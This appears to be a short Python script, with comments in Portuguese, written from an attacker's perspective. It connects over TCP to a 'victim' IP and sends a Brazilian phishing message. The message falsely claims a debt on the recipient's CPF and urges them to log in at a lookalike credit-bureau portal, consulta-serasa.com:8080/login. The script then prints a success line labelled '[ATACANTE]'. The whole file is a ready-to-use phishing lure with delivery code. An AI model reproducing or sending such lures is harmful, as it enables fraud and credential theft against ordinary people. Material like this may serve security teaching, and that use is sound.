import socket

HOST = '198.51.100.129'  # IP da vítima
PORT = 1234

mensagem = ("Prezado(a) cliente, identificamos uma pendência financeira em seu CPF no valor de R$289,70.\n\n"
            "Para evitar negativação do nome, acesse imediatamente o portal abaixo e realize a verificação dos dados:\n"
            "consulta-serasa.com:8080/login\n\n"
            "Após o login, você poderá gerar o boleto de quitação ou parcelar sua dívida.\n\n"
            "Atendimento automático 24h.")

tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
tcp.connect((HOST, PORT))
tcp.sendall(mensagem.encode())
print("[ATACANTE] Mensagem de Phishing enviada com sucesso.")
tcp.close()